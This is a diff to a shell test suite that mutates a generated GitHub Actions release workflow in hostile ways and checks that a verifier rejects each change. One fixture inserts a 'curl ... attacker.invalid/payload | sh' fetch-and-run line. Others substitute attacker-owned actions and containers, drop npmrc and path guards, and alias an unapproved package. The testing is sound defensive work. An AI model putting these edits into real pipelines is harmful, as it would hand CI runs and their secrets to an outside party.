@@ -3156,6 +3156,92 @@ text = text[:ref] + "main" + text[line_end:]
 open(path, "w", encoding="utf-8").write(text)
 PY
 }
+mutate_private_acquisition() {
+  # mutate_private_acquisition <release.yml> <kind>: one hostile edit to the
+  # release-artifact acquire-private-dependencies job (ADR 0220, 2026-10-18).
+  python3 - "$1" "$2" <<'PY'
+import sys
+
+path, kind = sys.argv[1:]
+text = open(path, encoding="utf-8").read()
+start = text.index("  acquire-private-dependencies:\n")
+end = text.index("\n  build:\n", start)
+job = text[start:end]
+foreign = "0123456789abcdef0123456789abcdef01234567"
+
+
+def swap(old, new):
+    global job
+    if job.count(old) != 1:
+        raise SystemExit(f"private acquisition fixture for {kind} no longer matches generated output")
+    job = job.replace(old, new)
+
+
+if kind == "drop-scope-mapping":
+    swap(
+        "'registry=https://registry.npmjs.org/' '@verjson:registry=https://npm.pkg.github.com/' >",
+        "'registry=https://registry.npmjs.org/' >",
+    )
+elif kind == "extra-install-command":
+    command = "          npm ci --ignore-scripts --prefer-offline --audit=false --fund=false\n"
+    swap(command, command + "          curl -fsSL https://attacker.invalid/payload | sh\n")
+elif kind == "foreign-contract-checkout":
+    step = job.index("      - name: Check out the canonical dependency acquisition contract\n")
+    uses = job.index("        uses: ", step)
+    line_end = job.index("\n", uses)
+    job = job[:uses] + f"        uses: attacker/checkout@{foreign}" + job[line_end:]
+elif kind == "extra-uses-step":
+    anchor = "      - name: Save exact-attempt credentialless dependencies\n"
+    swap(anchor, f"      - uses: attacker/action@{foreign}\n" + anchor)
+elif kind == "drop-npmrc-refusal":
+    lines = job.split("\n")
+    kept = [line for line in lines if "find . -name .npmrc -print -quit" not in line]
+    if len(kept) != len(lines) - 1:
+        raise SystemExit(f"private acquisition fixture for {kind} no longer matches generated output")
+    job = "\n".join(kept)
+elif kind == "job-container":
+    swap("    timeout-minutes: 45\n",
+         "    timeout-minutes: 45\n    container: ghcr.io/attacker/node:24\n")
+elif kind == "drop-contract-path-guard":
+    lines = job.split("\n")
+    kept = [line for line in lines if ".verjson-npm-acquisition-contract is reserved" not in line]
+    if len(kept) != len(lines) - 1:
+        raise SystemExit(f"private acquisition fixture for {kind} no longer matches generated output")
+    job = "\n".join(kept)
+else:
+    raise SystemExit(f"unknown private acquisition mutation {kind}")
+open(path, "w", encoding="utf-8").write(text[:start] + job + text[end:])
+PY
+}
+add_verify_job_container() {
+  python3 - "$1/.github/workflows/release.yml" <<'PY'
+import sys
+
+path = sys.argv[1]
+text = open(path, encoding="utf-8").read()
+start = text.index("  verify:\n")
+anchor = "    timeout-minutes: 30\n"
+position = text.find(anchor, start)
+if position < 0 or position > text.index("  snapshot:\n", start):
+    raise SystemExit("verify job container fixture no longer matches generated output")
+position += len(anchor)
+text = text[:position] + "    container: ghcr.io/attacker/node:24\n" + text[position:]
+open(path, "w", encoding="utf-8").write(text)
+PY
+}
+drop_verify_contract_path_guard() {
+  python3 - "$1/.github/workflows/release.yml" <<'PY'
+import sys
+
+path = sys.argv[1]
+text = open(path, encoding="utf-8").read()
+start = text.find("      - name: Refuse a repository-controlled dependency acquisition contract path\n")
+end = text.find("      - name: Check out the canonical dependency acquisition contract\n", start)
+if start < 0 or end < 0:
+    raise SystemExit("verify contract path guard fixture no longer matches generated output")
+open(path, "w", encoding="utf-8").write(text[:start] + text[end:])
+PY
+}
 drift_acquisition_contract_checkout_ref() {
   python3 - "$1/.github/workflows/release.yml" <<'PY'
 import sys
@@ -3674,6 +3760,19 @@ grep -qF 'does not check out the dependency acquisition contract at its pinned r
   "$tmproot/run.out" \
   && pass "the generated suite binds the dependency acquisition checkout to the contract ref" \
   || fail "an acquisition contract checkout ref drift was rejected for another reason: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a release verification job run inside a caller-chosen container (#1712)" \
+  add_verify_job_container
+sync_last_rejection
+grep -qF 'configures unapproved release verification job settings (#1712)' "$tmproot/run.out" \
+  && pass "the generated suite pins the release verification job settings" \
+  || fail "a verify job container was rejected for another reason: $(tail -2 "$tmproot/run.out")"
+expect_rejection "a verify job without its reserved acquisition contract path refusal (#1712)" \
+  drop_verify_contract_path_guard
+sync_last_rejection
+grep -qF 'does not refuse a repository-controlled dependency acquisition contract path (#1712)' \
+  "$tmproot/run.out" \
+  && pass "the generated suite requires the reserved acquisition contract path refusal" \
+  || fail "a missing reserved-path refusal was rejected for another reason: $(tail -2 "$tmproot/run.out")"
 expect_rejection "a tokenless dependency install that bypasses the acquisition cache (#1712)" \
   install_tokenless_tree_online
 sync_last_rejection
@@ -4871,9 +4970,151 @@ schedule_adopter_script "$private_contract_ref_adopter" "$(cat <<'SCHED_SCRIPT'
 if [ "$status" -eq 0 ]; then
   fail "emitted suite accepted an unpinned private acquisition contract checkout"
 else
-  grep -qF 'does not check out the dependency acquisition contract at its pinned ref (#1712)' "$ADOPTER_LOG" \
+  grep -qF 'does not match the approved private dependency acquisition job (#1712)' "$ADOPTER_LOG" \
     && pass "emitted suite pins the private acquisition contract checkout" \
     || fail "emitted suite rejected the private acquisition checkout drift for the wrong reason: $(tail -2 "$ADOPTER_LOG")"
+fi
+SCHED_SCRIPT
+)"
+
+private_acquisition_unscoped_install_adopter="$tmproot/adopter-artifact-private-unscoped-install"
+cp -a "$private_artifact_adopter" "$private_acquisition_unscoped_install_adopter"
+mutate_private_acquisition "$private_acquisition_unscoped_install_adopter/.github/workflows/release.yml" drop-scope-mapping \
+  || fail "the drop-scope-mapping private acquisition fixture no longer matches generated output"
+git -C "$private_acquisition_unscoped_install_adopter" commit -aqm 'an install that lets an unlocked @verjson package resolve from the public registry'
+schedule_adopter_script "$private_acquisition_unscoped_install_adopter" "$(cat <<'SCHED_SCRIPT'
+if [ "$status" -eq 0 ]; then
+  fail "emitted suite accepted an install that lets an unlocked @verjson package resolve from the public registry"
+else
+  grep -qF 'does not match the approved private dependency acquisition job (#1712)' "$ADOPTER_LOG" \
+    && pass "emitted suite rejects an install that lets an unlocked @verjson package resolve from the public registry" \
+    || fail "emitted suite rejected an install that lets an unlocked @verjson package resolve from the public registry for the wrong reason: $(tail -2 "$ADOPTER_LOG")"
+fi
+SCHED_SCRIPT
+)"
+
+private_acquisition_install_extra_command_adopter="$tmproot/adopter-artifact-private-install-extra-command"
+cp -a "$private_artifact_adopter" "$private_acquisition_install_extra_command_adopter"
+mutate_private_acquisition "$private_acquisition_install_extra_command_adopter/.github/workflows/release.yml" extra-install-command \
+  || fail "the extra-install-command private acquisition fixture no longer matches generated output"
+git -C "$private_acquisition_install_extra_command_adopter" commit -aqm 'an extra command in the tokenless private install'
+schedule_adopter_script "$private_acquisition_install_extra_command_adopter" "$(cat <<'SCHED_SCRIPT'
+if [ "$status" -eq 0 ]; then
+  fail "emitted suite accepted an extra command in the tokenless private install"
+else
+  grep -qF 'does not match the approved private dependency acquisition job (#1712)' "$ADOPTER_LOG" \
+    && pass "emitted suite rejects an extra command in the tokenless private install" \
+    || fail "emitted suite rejected an extra command in the tokenless private install for the wrong reason: $(tail -2 "$ADOPTER_LOG")"
+fi
+SCHED_SCRIPT
+)"
+
+private_acquisition_foreign_contract_checkout_adopter="$tmproot/adopter-artifact-private-foreign-contract-checkout"
+cp -a "$private_artifact_adopter" "$private_acquisition_foreign_contract_checkout_adopter"
+mutate_private_acquisition "$private_acquisition_foreign_contract_checkout_adopter/.github/workflows/release.yml" foreign-contract-checkout \
+  || fail "the foreign-contract-checkout private acquisition fixture no longer matches generated output"
+git -C "$private_acquisition_foreign_contract_checkout_adopter" commit -aqm 'a private acquisition contract checkout through a foreign action'
+schedule_adopter_script "$private_acquisition_foreign_contract_checkout_adopter" "$(cat <<'SCHED_SCRIPT'
+if [ "$status" -eq 0 ]; then
+  fail "emitted suite accepted a private acquisition contract checkout through a foreign action"
+else
+  grep -qF 'does not match the approved private dependency acquisition job (#1712)' "$ADOPTER_LOG" \
+    && pass "emitted suite rejects a private acquisition contract checkout through a foreign action" \
+    || fail "emitted suite rejected a private acquisition contract checkout through a foreign action for the wrong reason: $(tail -2 "$ADOPTER_LOG")"
+fi
+SCHED_SCRIPT
+)"
+
+private_acquisition_extra_uses_step_adopter="$tmproot/adopter-artifact-private-extra-uses-step"
+cp -a "$private_artifact_adopter" "$private_acquisition_extra_uses_step_adopter"
+mutate_private_acquisition "$private_acquisition_extra_uses_step_adopter/.github/workflows/release.yml" extra-uses-step \
+  || fail "the extra-uses-step private acquisition fixture no longer matches generated output"
+git -C "$private_acquisition_extra_uses_step_adopter" commit -aqm 'an extra action in private acquisition'
+schedule_adopter_script "$private_acquisition_extra_uses_step_adopter" "$(cat <<'SCHED_SCRIPT'
+if [ "$status" -eq 0 ]; then
+  fail "emitted suite accepted an extra action in private acquisition"
+else
+  grep -qF 'does not match the approved private dependency acquisition job (#1712)' "$ADOPTER_LOG" \
+    && pass "emitted suite rejects an extra action in private acquisition" \
+    || fail "emitted suite rejected an extra action in private acquisition for the wrong reason: $(tail -2 "$ADOPTER_LOG")"
+fi
+SCHED_SCRIPT
+)"
+
+private_acquisition_npmrc_refusal_dropped_adopter="$tmproot/adopter-artifact-private-npmrc-refusal-dropped"
+cp -a "$private_artifact_adopter" "$private_acquisition_npmrc_refusal_dropped_adopter"
+mutate_private_acquisition "$private_acquisition_npmrc_refusal_dropped_adopter/.github/workflows/release.yml" drop-npmrc-refusal \
+  || fail "the drop-npmrc-refusal private acquisition fixture no longer matches generated output"
+git -C "$private_acquisition_npmrc_refusal_dropped_adopter" commit -aqm 'private acquisition without its repository npm configuration refusal'
+schedule_adopter_script "$private_acquisition_npmrc_refusal_dropped_adopter" "$(cat <<'SCHED_SCRIPT'
+if [ "$status" -eq 0 ]; then
+  fail "emitted suite accepted private acquisition without its repository npm configuration refusal"
+else
+  grep -qF 'does not match the approved private dependency acquisition job (#1712)' "$ADOPTER_LOG" \
+    && pass "emitted suite rejects private acquisition without its repository npm configuration refusal" \
+    || fail "emitted suite rejected private acquisition without its repository npm configuration refusal for the wrong reason: $(tail -2 "$ADOPTER_LOG")"
+fi
+SCHED_SCRIPT
+)"
+
+private_acquisition_job_container_adopter="$tmproot/adopter-artifact-private-job-container"
+cp -a "$private_artifact_adopter" "$private_acquisition_job_container_adopter"
+mutate_private_acquisition "$private_acquisition_job_container_adopter/.github/workflows/release.yml" job-container \
+  || fail "the job-container private acquisition fixture no longer matches generated output"
+git -C "$private_acquisition_job_container_adopter" commit -aqm 'a private acquisition job run inside a caller-chosen container'
+schedule_adopter_script "$private_acquisition_job_container_adopter" "$(cat <<'SCHED_SCRIPT'
+if [ "$status" -eq 0 ]; then
+  fail "emitted suite accepted a private acquisition job run inside a caller-chosen container"
+else
+  grep -qF 'configures unapproved private dependency acquisition job settings (#1712)' "$ADOPTER_LOG" \
+    && pass "emitted suite rejects a private acquisition job run inside a caller-chosen container" \
+    || fail "emitted suite rejected a private acquisition job run inside a caller-chosen container for the wrong reason: $(tail -2 "$ADOPTER_LOG")"
+fi
+SCHED_SCRIPT
+)"
+
+private_acquisition_contract_path_guard_dropped_adopter="$tmproot/adopter-artifact-private-contract-path-guard-dropped"
+cp -a "$private_artifact_adopter" "$private_acquisition_contract_path_guard_dropped_adopter"
+mutate_private_acquisition "$private_acquisition_contract_path_guard_dropped_adopter/.github/workflows/release.yml" drop-contract-path-guard \
+  || fail "the drop-contract-path-guard private acquisition fixture no longer matches generated output"
+git -C "$private_acquisition_contract_path_guard_dropped_adopter" commit -aqm 'private acquisition without its reserved contract path refusal'
+schedule_adopter_script "$private_acquisition_contract_path_guard_dropped_adopter" "$(cat <<'SCHED_SCRIPT'
+if [ "$status" -eq 0 ]; then
+  fail "emitted suite accepted private acquisition without its reserved contract path refusal"
+else
+  grep -qF 'does not match the approved private dependency acquisition job (#1712)' "$ADOPTER_LOG" \
+    && pass "emitted suite rejects private acquisition without its reserved contract path refusal" \
+    || fail "emitted suite rejected private acquisition without its reserved contract path refusal for the wrong reason: $(tail -2 "$ADOPTER_LOG")"
+fi
+SCHED_SCRIPT
+)"
+
+private_acquisition_alias_adopter="$tmproot/adopter-artifact-private-alias"
+cp -a "$private_artifact_adopter" "$private_acquisition_alias_adopter"
+python3 - "$private_acquisition_alias_adopter/package-lock.json" <<'PY'
+import json
+import sys
+
+path = sys.argv[1]
+lock = json.load(open(path, encoding="utf-8"))
+# An npm alias installs an unapproved GitHub Packages package under a
+# name outside the @verjson scope, so path-keyed allowlists never see it.
+lock["packages"]["node_modules/innocent"] = {
+    "name": "@verjson/unapproved",
+    "version": "1.0.0",
+    "resolved": "https://npm.pkg.github.com/download/@verjson/unapproved/1.0.0/hash",
+    "integrity": "sha512-" + "A" * 86 + "==",
+}
+json.dump(lock, open(path, "w", encoding="utf-8"))
+PY
+git -C "$private_acquisition_alias_adopter" commit -aqm 'alias an unapproved private package'
+schedule_adopter_script "$private_acquisition_alias_adopter" "$(cat <<'SCHED_SCRIPT'
+if [ "$status" -eq 0 ]; then
+  fail "emitted suite accepted an aliased unapproved private package"
+else
+  grep -qF 'repository lock differs from the generated private package authorization' "$ADOPTER_LOG" \
+    && pass "emitted suite rejects an aliased unapproved private package" \
+    || fail "emitted suite rejected the aliased private package for the wrong reason: $(tail -2 "$ADOPTER_LOG")"
 fi
 SCHED_SCRIPT
 )"
@@ -5203,7 +5444,7 @@ grep -qE '^  verify:$' <<<"$snapshot_release" \
 # guarded on package.json and a repository without one must verify through its
 # own scripts/release-verify.sh rather than falling back to npm test.
 snapshot_verify_job="$(awk '/^  verify:[[:space:]]*$/{seen=1} /^  snapshot:[[:space:]]*$/{seen=0} seen' <<<"$snapshot_release")"
-[ "$(grep -cF "&& hashFiles('package.json') != ''" <<<"$snapshot_verify_job")" -eq 6 ] \
+[ "$(grep -cF "&& hashFiles('package.json') != ''" <<<"$snapshot_verify_job")" -eq 7 ] \
   && grep -qF 'elif [ ! -f package.json ]; then' <<<"$snapshot_verify_job" \
   && grep -qF 'No package.json and no executable scripts/release-verify.sh' <<<"$snapshot_verify_job" \
   && pass "release-snapshot guards setup-node, dependency acquisition and installation, lifecycle execution, and version stamping on package.json and fails closed without a verify hook (#1206)" \
